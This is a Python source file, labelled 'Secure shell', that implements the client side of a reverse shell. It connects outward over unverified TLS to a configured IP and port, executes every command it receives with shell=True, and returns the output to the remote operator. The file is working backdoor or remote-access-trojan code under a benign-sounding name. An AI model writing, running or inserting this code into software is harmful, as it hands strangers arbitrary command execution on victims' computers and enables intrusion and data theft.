# Date: 07/27/2018
# Author: Pure-L0G1C
# Description: Secure shell

import os
import ssl
import socket
import subprocess
from queue import Queue
from threading import Thread
from socket import timeout as TimeOutError


class Communicate(object):

    def __init__(self, session):
        self.recvs_decrypted = Queue()
        self.session_recv = 4096 << 12
        self.session = session
        self.is_alive = True
        self.pending = False

    def recv(self):
        self.session.settimeout(0.5)
        while self.is_alive:
            try:
                recv = self.session.recv(self.session_recv)

                if recv:
                    self.pending = False
                    data = recv.decode('utf8')
                    if data != '-1':
                        self.recvs_decrypted.put(data)

                else:
                    self.stop()
            except:
                pass

    def send(self, data):
        if len(data.strip()):
            if not self.is_alive:
                return
            try:
                self.session.sendall(data.encode('utf8'))
                self.pending = True
            except:
                pass

    def start(self):
        recv = Thread(target=self.recv)
        recv.daemon = True
        recv.start()

    def stop(self):
        self.is_alive = False


class Client(object):

    def __init__(self, communication, home):
        self.communication = communication
        self.is_alive = True
        self.home = home

    def start(self):
        self.communication.start()
        while all([self.is_alive, self.communication.is_alive]):
            while self.communication.recvs_decrypted.qsize():
                cmd = self.communication.recvs_decrypted.get()
                output = self.exe(cmd)
                self.communication.send(output)
                self.communication.send('-1')

    def exe(self, cmd):
        if cmd.strip() == 'cls':
            return '-1'
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            output = proc[0].decode('utf8')
            errors = proc[1].decode('utf8')
            output = output if output else errors
        except:
            output = ''

        if cmd.split()[0] == 'cd':
            if len(cmd.split()) != 1:
                path = ' '.join(cmd.split()[1:])
                if os.path.exists(path):
                    os.chdir(path)
            else:
                output = ''
                os.chdir(self.home)

        return output if len(output) else '-1'

    def stop(self):
        self.is_alive = False
        self.communication.is_alive = False


class SSH(object):

    def __init__(self, ip, port, home, max_time=10, verbose=False):
        self.ip = ip
        self.port = port
        self.home = home
        self.verbose = verbose
        self.cert = 'public.crt'
        self.max_time = max_time
        self.communication = None
        self.recipient_session = None

    def display(self, msg):
        if self.verbose:
            print('{}\n'.format(msg))

    def close(self):
        try:
            if self.communication:
                self.communication.stop()

            self.recipient_session.close()
            self.recipient_session.shutdown(socket.SHUT_RDWR)
        except:
            pass

    def send(self, cmd):
        if self.communication:
            return self.communication.send(cmd)

    def client(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.recipient_session = ssl.wrap_socket(
            sock, ssl_version=ssl.PROTOCOL_SSLv23)
        self.recipient_session.settimeout(self.max_time)
        try:
            self.recipient_session.connect((self.ip, self.port))
        except ConnectionRefusedError:
            self.display('Failed to connect to {}:{}'.format(
                self.ip, self.port))
            return -1

        communication = Communicate(self.recipient_session)

        if self.communication:
            self.communication.stop()

        self.communication = Client(communication, self.home)
        self.communication.start()
        return 0
